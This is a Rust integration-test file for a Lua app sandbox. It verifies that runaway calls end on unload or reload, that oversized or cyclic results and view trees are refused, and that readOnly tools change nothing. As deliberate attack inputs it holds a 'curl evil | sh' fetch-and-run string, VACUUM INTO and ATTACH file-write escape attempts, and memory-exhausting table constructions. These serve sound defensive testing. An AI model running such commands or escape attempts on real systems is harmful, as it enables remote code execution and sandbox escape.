#![allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)] // integration-test helpers
//! What an app cannot do to the host. Every test here failed before its fix.
//!
//! - an unload or a reload ends what the app was doing at its next host call;
//! - bounded conversion of what the app hands back (tool results, window trees): a cyclic or exponentially
//!   shared table is an error, not a stack overflow or an allocation;
//! - a `readOnly` call changes nothing: no data, no windows, no notifications, no shell, no state;
//! - the SQL sandbox holds against `VACUUM INTO` and `ATTACH` through `db:all`.

mod common;

use common::{agent_ctx, db, id, load, package, try_load_with, Stalling};
use serde_json::{json, Map, Value};
use std::{
    sync::Arc,
    time::{Duration, Instant},
};
use vos_application::{
    data::Params,
    ports::{AppData, AppRuntime, Notifier, PortResult},
    testing::RecordingShell,
};
use vos_domain::Notification;
use vos_lua::LuaRuntime;

/// "Ended, not still running": far above what any of these takes.
const PROMPTLY: Duration = Duration::from_secs(8);

// ---- a kill on unload (nothing budgets a call; unloading or replacing the app ends what it was doing) ------------

struct Quiet;
#[async_trait::async_trait]
impl Notifier for Quiet {
    async fn notify(&self, _: Notification) -> PortResult<()> {
        Ok(())
    }
}

struct Rig {
    runtime: Arc<LuaRuntime>,
    shell: Arc<RecordingShell>,
    db: Arc<vos_sqlite::AppDb>,
}

fn rig() -> Rig {
    let shell = Arc::new(RecordingShell::default());
    let runtime = Arc::new(LuaRuntime::new(Arc::new(Quiet), shell.clone()));
    Rig { runtime, shell, db: db() }
}

impl Rig {
    async fn load(&self, app: &str, src: &str) -> PortResult<vos_application::ports::LoadedApp> {
        let data: Arc<dyn AppData> = self.db.clone();
        self.runtime.load(&id(app), package(src, &[]), data).await
    }
    async fn tool(&self, app: &str, tool: &str) -> PortResult<Value> {
        self.runtime.call_tool(&id(app), tool, json!({}), agent_ctx(0), false).await
    }
}

const MANIFEST: &str = r#"app.manifest { id = "probe", name = "Probe", icon = "gear" }"#;

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn unloading_stops_a_runaway_call_and_the_vm_is_freed() {
    // nothing budgets the call: only the unload can end it
    let rig = rig();
    let src = format!(
        "{MANIFEST}\napp.tool {{ name = \"spin\", run = function() while true do app.kv:get(\"k\") end end }}"
    );
    rig.load("probe", &src).await.unwrap();
    let (runtime, started) = (rig.runtime.clone(), std::time::Instant::now());
    let call =
        tokio::spawn(
            async move { runtime.call_tool(&id("probe"), "spin", json!({}), agent_ctx(0), false).await },
        );
    tokio::time::sleep(Duration::from_millis(150)).await;
    assert!(!call.is_finished(), "the call is running");
    assert!(Arc::strong_count(&rig.db) > 1, "and the VM holds the database");

    rig.runtime.unload(&id("probe")).await.unwrap();
    let ended = tokio::time::timeout(PROMPTLY, call).await.expect("an unloaded app's call stops").unwrap();
    assert!(ended.unwrap_err().to_string().contains("unloaded"));
    assert!(started.elapsed() < PROMPTLY);
    assert_eq!(
        Arc::strong_count(&rig.db),
        1,
        "no VM, closure or handle of the app is left holding the database"
    );
    assert!(rig.tool("probe", "spin").await.is_err(), "and the app is gone");
}

// ---- blocker 3: bounded output, bounded effects, declared windows only ---------------------------------------

#[tokio::test]
async fn a_tool_result_that_expands_to_gigabytes_is_an_error_not_an_allocation() {
    let rig = rig();
    let src = format!(
        r#"{MANIFEST}
        -- 2^30 paths to the leaf, a handful of table allocations
        app.tool {{ name = "dag", readOnly = true, run = function()
          local t = {{ 1 }}
          for i = 1, 30 do t = {{ t, t }} end
          return t
        end }}
        app.tool {{ name = "text", readOnly = true, run = function()
          local s = string.rep("x", 1000000)
          local t = {{}}
          for i = 1, 40 do t[i] = s end
          return t
        end }}
        app.tool {{ name = "cycle", readOnly = true, run = function()
          local t = {{}}
          t.me = t
          return t
        end }}"#
    );
    rig.load("probe", &src).await.unwrap();
    for (tool, why) in
        [("dag", "more than 100000 values"), ("text", "bytes of text"), ("cycle", "contains itself")]
    {
        let started = std::time::Instant::now();
        let err = rig.tool("probe", tool).await.unwrap_err().to_string();
        assert!(err.contains(why), "{tool}: {err}");
        assert!(started.elapsed() < PROMPTLY, "{tool} took {:?}", started.elapsed());
    }
}

fn window_app(render: &str) -> String {
    format!("{MANIFEST}\napp.window(\"main\", {{ render = function(w)\n{render}\nend }})")
}

async fn render_error(render: &str) -> String {
    let rig = rig();
    rig.load("probe", &window_app(render)).await.unwrap();
    let started = std::time::Instant::now();
    let err = rig
        .runtime
        .open_view(&id("probe"), "v1", "main", Map::new(), Map::new())
        .await
        .expect_err("the tree must be refused");
    assert!(started.elapsed() < PROMPTLY, "refusing took {:?}", started.elapsed());
    err.to_string()
}

#[tokio::test]
async fn a_view_tree_that_contains_itself_is_refused_not_a_stack_overflow() {
    let err = render_error(r#"local n = { type = "Stack", key = "n" } n.children = { n } return n"#).await;
    assert!(err.contains("contains itself"), "{err}");
}

#[tokio::test]
async fn a_view_tree_nested_past_the_limit_is_refused_while_it_is_converted() {
    let err = render_error(
        r#"local n = { type = "Stack", key = "leaf" }
           for i = 1, 5000 do n = { type = "Stack", key = "k" .. i, children = { n } } end
           return n"#,
    )
    .await;
    assert!(err.contains("at most 64 levels deep"), "{err}");
}

#[tokio::test]
async fn a_view_tree_shared_at_every_level_is_cut_off_at_the_node_limit() {
    let err = render_error(
        r#"local n = { type = "Stack", key = "leaf" }
           for i = 1, 25 do n = { type = "Stack", key = "k" .. i, children = { n, n } } end
           return n"#,
    )
    .await;
    assert!(err.contains("at most 10000 nodes"), "{err}");
}

#[tokio::test]
async fn props_shared_at_every_level_are_cut_off_by_the_trees_budget() {
    let err = render_error(
        r#"local t = { 1 }
           for i = 1, 30 do t = { t, t } end
           return { type = "Stack", key = "n", props = { data = t } }"#,
    )
    .await;
    assert!(err.contains("more than"), "{err}");
}

#[tokio::test]
async fn open_window_accepts_only_windows_the_app_declared() {
    let rig = rig();
    let src = format!(
        r#"{MANIFEST}
        app.window("main", {{ render = function(w) return {{ type = "Stack", key = "n" }} end }})
        local function try(f) local ok, err = pcall(f); return {{ ok = ok, err = (not ok) and tostring(err) or nil }} end
        app.tool {{ name = "declared", run = function() app:openWindow("main", {{ a = 1 }}) return true end }}
        app.tool {{ name = "undeclared", run = function() return try(function() app:openWindow("evil", {{}}) end) end }}"#
    );
    rig.load("probe", &src).await.unwrap();
    rig.tool("probe", "declared").await.unwrap();
    assert_eq!(rig.shell.windows.lock().unwrap().len(), 1);
    let out = rig.tool("probe", "undeclared").await.unwrap();
    assert_eq!(out["ok"], false);
    let why = out["err"].as_str().unwrap();
    assert!(why.contains("no window `evil` is declared") && why.contains("declared: main"), "{why}");
    assert_eq!(rig.shell.windows.lock().unwrap().len(), 1, "nothing was asked of the shell");
}

// ---- AGOS-60: `app:windows` ----------------------------------------------------------------------------------

const WINDOWS_APP: &str = r#"
    app.window("main", { render = function(w) return { type = "Stack", key = "n" } end })
    local function try(f) local ok, err = pcall(f); return { ok = ok, err = (not ok) and tostring(err) or nil } end
    app.tool { name = "ids", readOnly = true, run = function()
      local ids = {}
      for _, w in ipairs(app:windows("main")) do ids[#ids + 1] = w.id end
      return ids
    end }
    app.tool { name = "announce", readOnly = true, run = function()
      return try(function() for _, w in ipairs(app:windows("main")) do w:announce("x") end end) end }
    app.tool { name = "undeclared", readOnly = true, run = function()
      return try(function() app:windows("evil") end) end }
"#;

async fn open_views(rig: &Rig, views: &[&str]) {
    for view in views {
        rig.runtime.open_view(&id("probe"), view, "main", Map::new(), Map::new()).await.unwrap();
    }
}

#[tokio::test]
async fn a_read_only_tool_may_list_the_open_windows_but_not_change_them() {
    let rig = rig();
    rig.load("probe", &format!("{MANIFEST}\n{WINDOWS_APP}")).await.unwrap();
    open_views(&rig, &["v1", "v2"]).await;

    assert_eq!(rig.tool("probe", "ids").await.unwrap(), json!(["v1", "v2"]), "listing is a read");
    let out = rig.tool("probe", "announce").await.unwrap();
    assert_eq!(out["ok"], false, "{out}");
    assert!(out["err"].as_str().unwrap().contains("readOnly"), "{out}");
    let effects = rig.runtime.take_view_effects(&id("probe")).await.unwrap();
    assert!(effects.is_empty(), "the refused call left nothing for the windows: {effects:?}");
}

#[tokio::test]
async fn app_windows_with_an_undeclared_name_is_an_error_that_names_app_windows() {
    let rig = rig();
    rig.load("probe", &format!("{MANIFEST}\n{WINDOWS_APP}")).await.unwrap();
    let out = rig.tool("probe", "undeclared").await.unwrap();
    assert_eq!(out["ok"], false, "{out}");
    let why = out["err"].as_str().unwrap();
    assert!(why.contains("app:windows: no window `evil` is declared"), "{why}");
    assert!(why.contains("declared: main"), "{why}");
    assert!(!why.contains("openWindow"), "the error names the call that was made: {why}");
}

#[tokio::test]
async fn app_windows_lists_the_open_windows_in_the_order_they_were_opened() {
    let rig = rig();
    rig.load("probe", &format!("{MANIFEST}\n{WINDOWS_APP}")).await.unwrap();
    // as text, `v10` sorts before `v2`
    open_views(&rig, &["v1", "v2", "v9", "v10", "v11"]).await;
    assert_eq!(rig.tool("probe", "ids").await.unwrap(), json!(["v1", "v2", "v9", "v10", "v11"]));
}

// ---- blocker 4 and major 15: a readOnly call changes nothing -------------------------------------------------

const READ_ONLY_APP: &str = r#"
    app.window("main", {
      onOpen = function(w) app.db:exec("insert into log(msg) values ('opened')") end,
      render = function(w) return { type = "Stack", key = "n" } end,
    })
    app.db:migrate { [1] = "create table log(id integer primary key, msg text)" }
    local state = app.state { n = 0 }
    local function try(f) local ok, err = pcall(f); return { ok = ok, err = (not ok) and tostring(err) or nil } end
    app.tool { name = "open", readOnly = true, run = function() return try(function() app:openWindow("main") end) end }
    app.tool { name = "notify", readOnly = true, run = function() return try(function() app.notify { title = "hi" } end) end }
    app.tool { name = "badge", readOnly = true, run = function() return try(function() app.shell.badge(1) end) end }
    app.tool { name = "command", readOnly = true, run = function()
      return try(function() app.shell.command { id = "c", title = "C", run = function() end } end) end }
    app.tool { name = "link", readOnly = true, run = function()
      return try(function() app.shell.deepLink("a/:id", function() end) end) end }
    app.tool { name = "state", readOnly = true, run = function() return try(function() state.n = 1 end) end }
    -- not declared readOnly: allowed to do all of it (but the caller may still require a read-only run)
    app.tool { name = "everything", run = function()
      state.n = state.n + 1
      app:openWindow("main")
      app.notify { title = "hi" }
      app.shell.badge(1)
      return state.n
    end }
    app.tool { name = "count", readOnly = true, run = function() return app.db:one("select count(*) as n from log").n end }
"#;

#[tokio::test]
async fn a_read_only_tool_cannot_open_a_window_notify_change_the_shell_or_assign_state() {
    let rig = rig();
    rig.load("probe", &format!("{MANIFEST}\n{READ_ONLY_APP}")).await.unwrap();
    for tool in ["open", "notify", "badge", "command", "link", "state"] {
        let out = rig.tool("probe", tool).await.unwrap();
        assert_eq!(out["ok"], false, "{tool} must be refused: {out}");
        assert!(out["err"].as_str().unwrap().contains("readOnly"), "{tool}: {out}");
    }
    assert!(rig.shell.windows.lock().unwrap().is_empty(), "no window was opened, so no onOpen could write");
    assert!(rig.shell.badges.lock().unwrap().is_empty() && rig.shell.commands.lock().unwrap().is_empty());
    assert!(rig.shell.links.lock().unwrap().is_empty());
    assert_eq!(rig.tool("probe", "count").await.unwrap(), json!(0), "the table is unchanged");

    // and a tool that is not readOnly still can (state was untouched by the refused write above)
    assert_eq!(rig.tool("probe", "everything").await.unwrap(), json!(1));
    assert_eq!(rig.shell.windows.lock().unwrap().len(), 1);
}

/// `app.state` compares the old and the new value; an `__eq` that reads `app.state` must not deadlock on the
/// tracker's lock (which would hang a worker thread of the host).
#[tokio::test]
async fn an_eq_metamethod_may_read_app_state_while_a_field_is_assigned() {
    let rig = rig();
    let app = format!(
        "{MANIFEST}\n{}",
        r#"
        local state = app.state { x = false, y = 7 }
        local mt = { __eq = function() return state.y == 7 end }
        app.tool { name = "eq", run = function()
          state.x = setmetatable({}, mt)
          state.x = setmetatable({}, mt)
          return state.y
        end }
        "#
    );
    rig.load("probe", &app).await.unwrap();
    let out = tokio::time::timeout(PROMPTLY, rig.tool("probe", "eq")).await.expect("the call hung");
    assert_eq!(out.unwrap(), json!(7));
}

#[tokio::test]
async fn a_caller_can_require_a_read_only_run_of_a_tool_that_is_not_declared_read_only() {
    let rig = rig();
    rig.load("probe", &format!("{MANIFEST}\n{READ_ONLY_APP}")).await.unwrap();
    let ctx = agent_ctx(0);
    let err = rig
        .runtime
        .call_tool(&id("probe"), "everything", json!({}), ctx.clone(), true)
        .await
        .unwrap_err()
        .to_string();
    assert!(err.contains("readOnly"), "the port's requirement is enforced by the adapter: {err}");
    assert!(rig.shell.windows.lock().unwrap().is_empty());
    // the requirement lasts one call
    let ok = rig.runtime.call_tool(&id("probe"), "everything", json!({}), ctx, false).await.unwrap();
    assert_eq!(ok, json!(1));
}

// ---- minors ---------------------------------------------------------------------------------------------------

#[tokio::test]
async fn loadstring_getfenv_and_setfenv_are_not_in_the_sandbox() {
    let src = r#"
        app.on("probe", function()
          return { loadstring = loadstring == nil, getfenv = getfenv == nil, setfenv = setfenv == nil }
        end)
    "#;
    let vm = load(src).await;
    let out = vm.emit("probe", json!(null)).await.unwrap();
    for name in ["loadstring", "getfenv", "setfenv"] {
        assert_eq!(out[name], true, "{name} must be gone: {out}");
    }
}

/// SQLite's authorizer has no action for `VACUUM`, so `VACUUM INTO 'file'` is a file write the sandbox must
/// refuse by other means; `ATTACH` is denied by the authorizer. Through Lua `db:all` and `db:exec`.
#[tokio::test]
async fn vacuum_into_and_attach_are_refused_through_db_all_and_exec() {
    let dir = std::env::temp_dir().join(format!("agentos-vacuum-{}", std::process::id()));
    std::fs::create_dir_all(&dir).unwrap();
    let (vacuumed, attached) = (dir.join("vacuumed.db"), dir.join("attached.db"));
    let src = format!(
        r#"
        local function try(f) local ok, err = pcall(f); return {{ ok = ok, err = (not ok) and tostring(err) or nil }} end
        app.on("probe", function()
          return {{
            vacuum_all = try(function() return app.db:all("VACUUM INTO '{vacuumed}'") end),
            vacuum_exec = try(function() return app.db:exec("vacuum into '{vacuumed}'") end),
            attach_all = try(function() return app.db:all("ATTACH DATABASE '{attached}' AS evil") end),
            attach_exec = try(function() return app.db:exec("ATTACH '{attached}' AS evil") end),
          }}
        end)"#,
        vacuumed = vacuumed.display(),
        attached = attached.display(),
    );
    let vm = load(&src).await;
    let out = vm.emit("probe", json!(null)).await.unwrap();
    for route in ["vacuum_all", "vacuum_exec", "attach_all", "attach_exec"] {
        assert_eq!(out[route]["ok"], false, "{route} must be refused: {out}");
        let why = out[route]["err"].as_str().unwrap();
        assert!(why.contains("not authorized") || why.contains("authorization denied"), "{route}: {why}");
    }
    assert!(!vacuumed.exists(), "VACUUM INTO wrote a file outside the app's database");
    assert!(!attached.exists(), "ATTACH created a file outside the app's database");
    let _ = std::fs::remove_dir_all(dir);
}

// ---- wave D1: the second review's sandbox holes ----------------------------------------------------------------

// N1: a host call inside a coroutine (it once switched a CPU budget off; there is no budget now).

/// On Lua 5.1 a host call inside the app's own coroutine is not refused (the resume wrappers pass the
/// executor's wait outward, see `async_coroutines.lua`), so nothing is ever parked: the call finishes before
/// the coroutine's `resume` returns, and what the app sees is what it would see on the main thread.
#[tokio::test]
async fn a_host_call_inside_a_coroutine_finishes_before_resume_returns_and_leaves_nothing_parked() {
    let src = r#"
      app.on("probe", function()
        local co = coroutine.create(function() return app.kv:get("k") end)
        local ok, value = coroutine.resume(co)
        local wrapped = coroutine.wrap(function() return app.db:all("select 1 as x") end)
        local ok2, rows = pcall(wrapped)
        -- coroutines still do what they are for, and the main thread still reaches the host afterwards
        local gen = coroutine.wrap(function() for i = 1, 3 do coroutine.yield(i) end end)
        return { ok = ok, value = value, status = coroutine.status(co), ok2 = ok2, rows = rows,
                 gen = gen() + gen() + gen(), kv = app.kv:get("k") }
      end)
    "#;
    let out = load(src).await.emit("probe", json!(null)).await.unwrap();
    assert_eq!(out["ok"], true, "{out}");
    assert_eq!(out["status"], "dead", "the coroutine ran to its end, it is not parked: {out}");
    assert_eq!(out["ok2"], true, "{out}");
    assert_eq!(out["rows"], json!([{"x": 1}]), "{out}");
    assert_eq!(out["gen"], 6, "{out}");
    assert_eq!(out["kv"], Value::Null);
}

/// The same parked call started inside `db:tx` held the database's write gate after the call had returned.
#[tokio::test]
async fn a_coroutine_cannot_leave_the_write_gate_held_after_the_call_returns() {
    let src = r#"
      app.on("leak", function()
        local co = coroutine.create(function()
          app.db:tx(function()
            app.db:exec("create table if not exists t(a)")
            app.db:exec("insert into t values (1)")
          end)
        end)
        coroutine.resume(co)
        KEEP = co
        return coroutine.status(co)
      end)
    "#;
    let data = db();
    let vm = try_load_with("leak", src, data.clone()).await.unwrap();
    vm.emit("leak", json!(null)).await.unwrap();
    let write = tokio::time::timeout(
        Duration::from_secs(3),
        data.exec("create table if not exists y(a)".into(), vec![]),
    )
    .await
    .expect("the database's write gate is free once the call has returned");
    write.unwrap();
}

/// A call cancelled between two statements of a `db:tx` (its caller gave up) must not keep the transaction,
/// and with it the write gate, until some later call happens to start.
#[tokio::test]
async fn a_cancelled_call_gives_up_its_transaction_at_once() {
    // a call held at a host call (a statement that never finishes) with the transaction open in the VM
    let src = r#"
      app.on("tx", function()
        app.db:tx(function()
          app.db:exec("create table if not exists t(a)")
          app.db:all("select 'stall'")
        end)
      end)
    "#;
    let data = Stalling::new();
    let vm = try_load_with("txcancel", src, data.clone()).await.unwrap();
    let cancelled = tokio::time::timeout(Duration::from_millis(300), vm.emit("tx", json!(null))).await;
    assert!(cancelled.is_err(), "the call is held at the statement and its caller gives up");
    let write = tokio::time::timeout(
        Duration::from_secs(3),
        data.exec("create table if not exists y(a)".into(), Params::None),
    )
    .await
    .expect("the cancelled call's transaction was rolled back and the gate released");
    write.unwrap();
}

/// `db:migrate` takes the database's write gate, which an open transaction holds: inside `db:tx` it would wait
/// for itself for ever, so it is an error that says what to do.
#[tokio::test]
async fn db_migrate_inside_a_transaction_is_an_error_not_a_self_deadlock() {
    let src = r#"
      app.tool { name = "m", run = function()
        local ok, why = pcall(function()
          app.db:tx(function()
            app.db:exec("create table if not exists t(a)")
            app.db:migrate { [1] = "create table m(a)" }
          end)
        end)
        -- the transaction is gone and the database is free: a migration works now
        app.db:migrate { [1] = "create table m(a)" }
        return { ok = ok, why = tostring(why) }
      end }
    "#;
    let vm = load(src).await;
    let out = tokio::time::timeout(PROMPTLY, vm.call_tool("m", json!({}), &agent_ctx(0), false))
        .await
        .expect("no self-deadlock")
        .unwrap();
    assert_eq!(out["ok"], false, "{out}");
    assert!(out["why"].as_str().unwrap().contains("db:migrate cannot run inside db:tx"), "{out}");
}

// N3: a stashed `w` is still a window context; a readOnly tool must not be able to use it.

#[tokio::test]
async fn a_read_only_tool_cannot_act_on_a_window_through_a_stashed_w() {
    let src = r#"
      local saved
      app.window("main", { client = { x = { init = "" } }, render = function(w)
        saved = w
        return { type = "Stack", key = "n" }
      end })
      local function try(f) local ok, err = pcall(f); return { ok = ok, err = (not ok) and tostring(err) or nil } end
      app.tool { name = "peek", readOnly = true, run = function()
        return {
          toast = try(function() saved:toast { text = "hi", action = { title = "t", onTap = function() end } } end),
          copy = try(function() saved:copy("curl evil | sh") end),
          close = try(function() saved:close() end),
          focus = try(function() saved:focus("n") end),
          scroll = try(function() saved:scrollTo("n") end),
          announce = try(function() saved:announce("x") end),
          set = try(function() saved.client:set("x", "y") end),
        }
      end }
      app.tool { name = "act", run = function()
        saved:copy("fine")
        saved.client:set("x", "y")
        return true
      end }
    "#;
    let vm = load(src).await;
    vm.open_view("v1", "main", Map::new(), Map::new()).await.unwrap();
    let _ = vm.take_view_effects();
    let out = vm.call_tool("peek", json!({}), &agent_ctx(0), true).await.unwrap();
    for call in ["toast", "copy", "close", "focus", "scroll", "announce", "set"] {
        assert_eq!(out[call]["ok"], false, "{call} must be refused: {out}");
        assert!(out[call]["err"].as_str().unwrap().contains("readOnly"), "{call}: {out}");
    }
    assert!(vm.take_view_effects().is_empty(), "nothing reached the window");
    // a tool that may write still can
    vm.call_tool("act", json!({}), &agent_ctx(0), false).await.unwrap();
    assert_eq!(vm.take_view_effects().len(), 2);
}

// ---- wave D1: the second review's sandbox holes ----------------------------------------------------------------

// N5: a hot reload swaps the VM in; the one it replaces must stop, not carry on writing.

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn a_hot_reload_retires_the_vm_it_replaces() {
    let rig = rig();
    let v1 = format!(
        "{MANIFEST}\napp.tool {{ name = \"spin\", run = function() while true do app.kv:get(\"k\") end end }}"
    );
    rig.load("probe", &v1).await.unwrap();
    let (runtime, started) = (rig.runtime.clone(), Instant::now());
    let call =
        tokio::spawn(
            async move { runtime.call_tool(&id("probe"), "spin", json!({}), agent_ctx(0), false).await },
        );
    tokio::time::sleep(Duration::from_millis(150)).await;
    assert!(!call.is_finished(), "the call is running on the old VM");

    let v2 = format!("{MANIFEST}\napp.tool {{ name = \"spin\", run = function() return 1 end }}");
    rig.load("probe", &v2).await.unwrap();
    let ended = tokio::time::timeout(PROMPTLY, call).await.expect("the replaced VM's call stops").unwrap();
    assert!(ended.unwrap_err().to_string().contains("unloaded"));
    assert!(started.elapsed() < PROMPTLY);
    assert_eq!(rig.tool("probe", "spin").await.unwrap(), json!(1), "the new version answers");
}

// ---- review fixes: a cancelled render, and closing a window outside the gate --------------------------------------

/// A render marks the tracker pure (`app.state` cannot be assigned) and opens a source scope. When the call was
/// cancelled at a host call (the client's socket closed), both stayed set until some later render ended, so every
/// tool that assigned `app.state` failed with "render must be pure" in between.
#[tokio::test]
async fn a_render_cancelled_at_a_host_call_leaves_app_state_assignable() {
    let rig = rig();
    let src = format!(
        r#"{MANIFEST}
        local state = app.state {{ n = 0 }}
        app.window("main", {{ render = function(w)
          local rows = app.db:all("select 1 as one")
          return {{ type = "Text", key = "t", props = {{ text = tostring(#rows + state.n) }} }}
        end }})
        app.tool {{ name = "bump", run = function()
          state.n = state.n + 1
          return state.n
        end }}"#
    );
    rig.load("probe", &src).await.unwrap();
    // poll the open once (it parks at the database call), then drop it: the cancelled call
    let app = id("probe");
    let open = rig.runtime.open_view(&app, "v1", "main", Map::new(), Map::new());
    tokio::select! {
        biased;
        _ = open => panic!("the open finished without waiting at the host call"),
        () = std::future::ready(()) => {}
    }
    let bumped = tokio::time::timeout(PROMPTLY, rig.tool("probe", "bump"))
        .await
        .expect("the tool call hung")
        .expect("assigning app.state after a cancelled render must work");
    assert_eq!(bumped, json!(1));
}

/// `onClose` was looked up with `spec:get`, which runs an app's `__index` outside the VM's gate (another call
/// may be running in the VM at the same time). It is read raw now: an `onClose` that only an `__index` supplies
/// is not run, and the `__index` is not either.
#[tokio::test]
async fn closing_a_window_does_not_run_app_code_outside_the_gate() {
    let rig = rig();
    let src = format!(
        r#"{MANIFEST}
        local lookups = 0
        local spec = {{ render = function(w) return {{ type = "Text", key = "t", props = {{ text = "x" }} }} end }}
        setmetatable(spec, {{ __index = function(_, key) lookups = lookups + 1 end }})
        app.window("main", spec)
        app.tool {{ name = "lookups", readOnly = true, run = function() return lookups end }}"#
    );
    rig.load("probe", &src).await.unwrap();
    rig.runtime.open_view(&id("probe"), "v1", "main", Map::new(), Map::new()).await.unwrap();
    let before = rig.tool("probe", "lookups").await.unwrap().as_u64().unwrap();
    rig.runtime.close_view(&id("probe"), "v1").await.unwrap();
    let after = rig.tool("probe", "lookups").await.unwrap().as_u64().unwrap();
    assert_eq!(before, after, "closing the window ran the spec's __index");
}
